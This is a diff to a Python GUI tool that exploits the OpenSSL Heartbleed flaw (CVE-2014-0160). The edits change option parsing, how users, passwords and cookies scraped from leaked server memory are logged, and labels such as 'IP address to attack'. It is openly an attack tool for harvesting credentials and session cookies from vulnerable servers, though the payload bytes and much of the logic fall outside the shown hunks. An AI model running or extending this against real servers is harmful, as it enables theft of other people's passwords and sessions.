@@ -27,14 +27,6 @@ class colors:
     UNDERLINE = '\033[4m'
 
 options = OptionParser(usage='%prog server [options]', description='Test for SSL heartbeat vulnerability (CVE-2014-0160)')
-options.add_option('-p', '--port', type='int', default=8443, help='TCP port to test (default: 8443)')
-options.add_option('-n', '--num', type='int', default=1, help='Number of times to connect/loop (default: 1)')
-options.add_option('-f', '--file', type='str', default='', help='Name of the file in which to dump the output (default: output.txt)')
-options.add_option('-v', '--verbose', default=False, help='Run exploit script and dump all output to console; does not skip empty lines (default: false)', action='store_true')
-options.add_option('-q', '--quiet', default=False, help='Run exploit script without dumping output to the console (default: false)', action='store_true')
-options.add_option('-c', '--cookie', default=False, help='Detect whether exploit returned any cookies (default: false)', action='store_true')
-options.add_option('-w', '--pwd', default=False, help='Detect whether exploit returned any passwords (default: false)', action='store_true')
-options.add_option('-k', '--key', type='str', default='', help='Input key to extract from server dump (default: empty)')
 
 def h2bin(x):
     return x.replace(' ', '').replace('\n', '').decode('hex')
@@ -73,6 +65,10 @@ hb = h2bin('''
 
 
 def logList(list, name, color, delim = ''):
+    # Return without printing (if quite option specified by user)
+    if len(list) < 1:
+        return
+
     # Build message string
     # Use delim to detect whether we are printing cookies (cookies are printed on separate lines)
     if delim == '\n':
@@ -104,7 +100,7 @@ def getCredentials(info, key):
         # Get username of current user (and add to users list)
         i = skip(info, 0, '&.;')
         items.append(info[:i])
-        output.insert('end', info[:i] + "\n")
+        output.insert('end', key + ": " + info[:i] + "\n")
         # Strip current username from info string
         info = info[i+1:]
         i = len(info)
@@ -160,8 +156,11 @@ def hexdump(s):
     if len(key) > 0:
         query = getCredentials(info, key)
 
-    if len(file) == 0 and not quiet:
+    if len(file) == 0:
         print
+
+    if users[0] == '0':
+        users = users[1:]
 
     return users, passwords, cookies, query, hasPwd, hasCookie
 
@@ -211,7 +210,7 @@ def hit_hb(s, file, key):
             users, passwords, cookies, query, hasPwd, hasCookie = hexdump(pay)
 
             # Log to console the list of users
-            logList(users[1:], 'USERS', colors.OKBLUE)
+            logList(users, 'USERS', colors.OKBLUE)
             # Log to console the list of passwords
             logList(passwords, 'PASSWORDS', colors.OKBLUE)
             # Log to console the list of cookies
@@ -249,6 +248,7 @@ def execute():
     e4.config(state = 'disabled')
     e5.config(state = 'disabled')
     output.config(state = 'normal')
+    output.insert(END, 'Items that were returned by Heartbeat: \n')
 
     IP = IP_text.get()
     PORT = PORT_text.get()
@@ -285,6 +285,12 @@ def execute():
       sys.stdout.flush()
       s.send(hb)
       hit_hb(s, FILE, KEY)
+    
+    e1.config(state = 'normal')
+    e2.config(state = 'normal')
+    e3.config(state = 'normal')
+    e4.config(state = 'normal')
+    e5.config(state = 'normal')
 
 # ****************  GUI starts here *******************
 
@@ -324,20 +330,20 @@ bottomframe.pack(side = BOTTOM, fill = X)
 l1 = Label(topframe, text = "IP address to attack: ")
 l1.grid(row = 1, column = 1)
 
-l2 = Label(topframe, text = "Port to attack: ")
+l2 = Label(topframe, text = "Port to attack (Default 8443): ")
 l2.grid(row = 2, column = 1)
 
-l3 = Label(topframe, text = "Times to run attack: ")
+l3 = Label(topframe, text = "Times to send heartbeat: ")
 l3.grid(row = 3, column = 1)
 
-l4 = Label(topframe, text = "Select output file name: ")
+l4 = Label(topframe, text = "(Optional) Insert filename to dump to: ")
 l4.grid(row = 4, column = 1)
 
-l5 = Label(topframe, text = "Insert additional keyword (optional): ")
+l5 = Label(topframe, text = "(optional) Insert additional keyword: ")
 l5.grid(row = 5, column = 1)
 
 IP_text = StringVar()
-IP_text.set("192.168.1.101")
+IP_text.set("192.168.43.23")
 e1 = Entry(topframe, textvariable = IP_text)
 e1.grid(row = 1, column = 3)
 
@@ -352,7 +358,7 @@ e3 = Entry(topframe, textvariable = TIMES_text)
 e3.grid(row = 3, column = 3)
 
 FILE_text = StringVar()
-FILE_text.set("output.txt")
+FILE_text.set("")
 e4 = Entry(topframe, textvariable = FILE_text)
 e4.grid(row = 4, column = 3)
 
@@ -373,7 +379,6 @@ statusbar = Label(bottomframe, textvariable = status , bd = 1, relief = SUNKEN, 
 statusbar.pack(side = BOTTOM, fill = X)
 
 output = Text(middleframe, width = 80, height = 10)
-output.insert('end', 'Output will appear here.')
 output.config(state = 'disabled')
 output.pack()
 
